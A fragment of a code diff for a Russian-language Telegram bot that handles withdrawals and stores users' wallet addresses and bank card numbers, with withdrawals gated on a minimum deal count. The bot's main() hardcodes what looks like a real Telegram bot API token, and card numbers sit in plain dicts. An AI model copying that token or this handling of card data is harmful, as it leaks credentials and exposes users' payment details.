+                    if not can_withdraw:
+                        await update.message.reply_text(get_text(user_id, 'withdraw_deficit', context, needed=needed, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT, deals=user_deals_count.get(user_id, 0), min_deals=MIN_DEALS_FOR_WITHDRAWAL), reply_markup=get_back_keyboard(user_id, context))
+                        return
+                else:
+                    await update.message.reply_text("❌ Неизвестный метод вывода", reply_markup=get_back_keyboard(user_id, context))
                     return
                 success = await process_withdrawal(user_id, amount, method, details, context)
                 context.user_data.pop('waiting_for_withdraw_amount', None)
@@ -1677,28 +1981,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except ValueError:
                 await update.message.reply_text("❌ **НЕВЕРНЫЙ ФОРМАТ СУММЫ!**\n\nПожалуйста, введите число в формате: 1000.50", reply_markup=get_back_keyboard(user_id, context))
 
-        elif context.user_data.get('waiting_for_stars_withdrawal'):
-            parts = text.strip().split()
-            if len(parts) != 2 or not parts[1].startswith('@'):
-                await update.message.reply_text("❌ Неверный формат. Введите сумму и username через пробел, например: 50 @username", reply_markup=get_back_keyboard(user_id, context))
-                return
-            try:
-                amount = float(parts[0])
-                if amount < 1:
-                    await update.message.reply_text("❌ Минимальная сумма вывода звёзд — 1 ⭐️", reply_markup=get_back_keyboard(user_id, context))
-                    return
-                target_username = parts[1]
-                stars_balance = get_user_stars_balance(user_id)
-                if amount > stars_balance:
-                    await update.message.reply_text(get_text(user_id, 'insufficient_stars_balance', context, stars_balance=stars_balance, need=amount - stars_balance), reply_markup=get_back_keyboard(user_id, context))
-                    return
-                success = await process_stars_withdrawal(user_id, amount, target_username, context)
-                context.user_data.pop('waiting_for_stars_withdrawal', None)
-                if not success:
-                    await update.message.reply_text(get_text(user_id, 'withdraw_error', context), reply_markup=get_main_keyboard(user_id, context))
-            except ValueError:
-                await update.message.reply_text("❌ Неверный формат суммы.", reply_markup=get_back_keyboard(user_id, context))
-
         elif context.user_data.get('waiting_for_wallet'):
             wallet_address = text.strip()
             if len(wallet_address) < 10:
@@ -1707,11 +1989,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_wallets[user_id] = wallet_address
             context.user_data['waiting_for_wallet'] = False
             deals = user_deals_count.get(user_id, 0)
-            await update.message.reply_text(get_text(user_id, 'wallet_saved', context,
-                                                     wallet=wallet_address,
-                                                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
-                                                     fee=SYSTEM_FEE_PERCENT,
-                                                     deals=deals), reply_markup=get_back_keyboard(user_id, context), parse_mode='HTML')
+            await update.message.reply_text(get_text(user_id, 'wallet_saved', context, wallet=wallet_address, min_withdraw=MIN_WITHDRAWAL_AMOUNT, fee=SYSTEM_FEE_PERCENT, deals=deals), reply_markup=get_back_keyboard(user_id, context), parse_mode='HTML')
 
         elif context.user_data.get('waiting_for_card'):
             card_number = text.strip()
@@ -1721,11 +1999,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_cards[user_id] = card_number
             context.user_data['waiting_for_card'] = False
             deals = user_deals_count.get(user_id, 0)
-            await update.message.reply_text(get_text(user_id, 'card_saved', context,
-                                                     card=card_number,
-                                                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
-                                                     fee=SYSTEM_FEE_PERCENT,
-                                                     deals=deals), reply_markup=get_back_keyboard(user_id, context), parse_mode='HTML')
+            await update.message.reply_text(get_text(user_id, 'card_saved', context, card=card_number, min_withdraw=MIN_WITHDRAWAL_AMOUNT, fee=SYSTEM_FEE_PERCENT, deals=deals), reply_markup=get_back_keyboard(user_id, context), parse_mode='HTML')
 
         else:
             await send_main_menu_with_photo(update.message.chat_id, context)
@@ -1733,12 +2007,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Ошибка в handle_message: {e}")
         await update.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте еще раз.")
 
-# ------------------ ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД ------------------
 async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message:
         await send_main_menu_with_photo(update.message.chat_id, context)
 
-# ------------------ ОБРАБОТЧИК ОШИБОК ------------------
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"Ошибка при обработке обновления {update}: {context.error}")
 
@@ -1747,7 +2019,7 @@ def main():
     try:
         print("🔄 Запуск бота...")
         print("✅ Добавлена поддержка двух языков (русский/английский) с выбором при старте")
-        print(f"📊 Для вывода рублей необходимо {MIN_DEALS_FOR_WITHDRAWAL} успешных сделок (кроме новых пользователей)")
+        print(f"📊 Для вывода необходимо {MIN_DEALS_FOR_WITHDRAWAL} успешных сделок (кроме новых пользователей)")
 
         application = Application.builder().token("8434337177:AAF78qGuyJ_F8O2hVNCnJ-p3S63U3rVgWMU").build()
 
@@ -1771,16 +2043,17 @@ def main():
         print("✅ Бот запущен успешно!")
         application.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
 
-    except Conflict as e:
-        print("❌ ОШИБКА: Обнаружено несколько запущенных ботов! Завершите все процессы Python.")
-        logger.error(f"Конфликт: {e}")
     except Exception as e:
         logger.error(f"Критическая ошибка при запуске бота: {e}")
-        print(f"❌ Критическая ошибка: {e}")
+        print(f"❌ Критическая ошибка: {e}", file=sys.stderr)
+        import traceback
+        traceback.print_exc(file=sys.stderr)
+        while True:
+            time.sleep(60)
 
-# =========================================================================
-# ПРОСТОЙ HTTP-СЕРВЕР ДЛЯ HEALTH CHECK (для Render)
-# =========================================================================
+
+# ПРОСТОЙ HTTP-СЕРВЕР ДЛЯ HEALTH CHECK (с reuse address)
+
 import http.server
 import socketserver
 import threading
